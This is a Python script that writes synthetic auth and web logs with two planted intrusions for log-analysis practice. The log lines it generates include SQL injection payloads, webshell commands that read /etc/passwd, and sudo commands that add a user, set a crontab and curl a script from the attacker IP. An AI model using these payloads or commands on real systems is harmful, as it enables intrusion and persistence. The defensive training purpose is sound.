"""Generate synthetic SSH + web logs with a hidden multi-stage intrusion.
Everything is fake (RFC 5737 documentation IPs). Safe to practice on.
Usage: python generate_logs.py
"""
import datetime as dt
import os
import random

random.seed(7)
OUT = "sample_logs"
os.makedirs(OUT, exist_ok=True)
BASE = dt.datetime(2026, 11, 1, 0, 0, 0)

auth, web = [], []


def sys_ts(t):
    return t.strftime("%b %e %H:%M:%S")


def web_ts(t):
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


def add_auth(t, msg):
    auth.append((t, f"{sys_ts(t)} web01 {msg}"))


def add_web(t, ip, method, path, status, size, ua):
    web.append((t, f'{ip} - - [{web_ts(t)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'))


# ---- Normal background noise ----
users = ["alice", "bob", "carol"]
UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0", "Mozilla/5.0 (Macintosh) Safari/605.1"]
for _ in range(120):
    t = BASE + dt.timedelta(seconds=random.randint(0, 86399))
    u = random.choice(users)
    ip = f"10.0.0.{random.randint(10, 40)}"
    add_auth(t, f"sshd[{random.randint(1000, 9999)}]: Accepted publickey for {u} from {ip} port {random.randint(40000, 60000)} ssh2")
for _ in range(900):
    t = BASE + dt.timedelta(seconds=random.randint(0, 86399))
    ip = f"192.0.2.{random.randint(1, 200)}"
    path = random.choice(["/", "/products.php?id=%d" % random.randint(1, 50), "/about", "/contact", "/static/app.js"])
    add_web(t, ip, "GET", path, 200, random.randint(500, 9000), random.choice(UA))
for _ in range(10):  # a few harmless typos
    t = BASE + dt.timedelta(seconds=random.randint(0, 86399))
    add_auth(t, f"sshd[4242]: Failed password for bob from 10.0.0.22 port {random.randint(40000, 60000)} ssh2")

# ---- Intrusion 1: web recon + SQLi + webshell (198.51.100.77) ----
t = BASE + dt.timedelta(hours=1, minutes=30)
atk = "198.51.100.77"
for p in ["/admin", "/phpmyadmin/", "/.git/config", "/backup.zip", "/wp-login.php"]:
    t += dt.timedelta(seconds=1)
    add_web(t, atk, "GET", p, 404, 196, "Nikto/2.5.0")
for payload in ["1'%20OR%20'1'='1", "1%20UNION%20SELECT%20username,password%20FROM%20users--", "1;SELECT%20SLEEP(5)--"]:
    t += dt.timedelta(seconds=2)
    add_web(t, atk, "GET", f"/products.php?id={payload}", 200, 4410, "sqlmap/1.7.2#stable")
t += dt.timedelta(minutes=6)
add_web(t, atk, "POST", "/upload.php", 200, 88, "Mozilla/5.0 (X11; Linux x86_64)")
for cmd in ["id", "whoami", "cat%20/etc/passwd"]:
    t += dt.timedelta(seconds=20)
    add_web(t, atk, "GET", f"/uploads/img_0192.php?cmd={cmd}", 200, 120, "Mozilla/5.0 (X11; Linux x86_64)")

# ---- Intrusion 2: SSH brute force -> success -> persistence (203.0.113.45) ----
t = BASE + dt.timedelta(hours=2, minutes=11)
atk2 = "203.0.113.45"
names = ["root", "admin", "ubuntu", "test", "oracle", "deploy", "postgres"]
for i in range(64):
    t += dt.timedelta(seconds=random.randint(2, 5))
    n = random.choice(names)
    inv = "" if n == "root" else "invalid user "
    add_auth(t, f"sshd[7001]: Failed password for {inv}{n} from {atk2} port {random.randint(30000, 60000)} ssh2")
t += dt.timedelta(seconds=4)
add_auth(t, f"sshd[7090]: Accepted password for deploy from {atk2} port 51514 ssh2")
t += dt.timedelta(seconds=40)
add_auth(t, "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_backup")
t += dt.timedelta(seconds=15)
add_auth(t, "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -u svc_backup /tmp/.x")
t += dt.timedelta(seconds=30)
add_auth(t, "sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl http://203.0.113.45:8080/c.sh -o /tmp/.c.sh")

for name, rows in (("auth.log", auth), ("web_access.log", web)):
    rows.sort(key=lambda r: r[0])
    with open(os.path.join(OUT, name), "w") as f:
        f.write("\n".join(r[1] for r in rows) + "\n")
    print(f"wrote {OUT}/{name}: {len(rows)} lines")
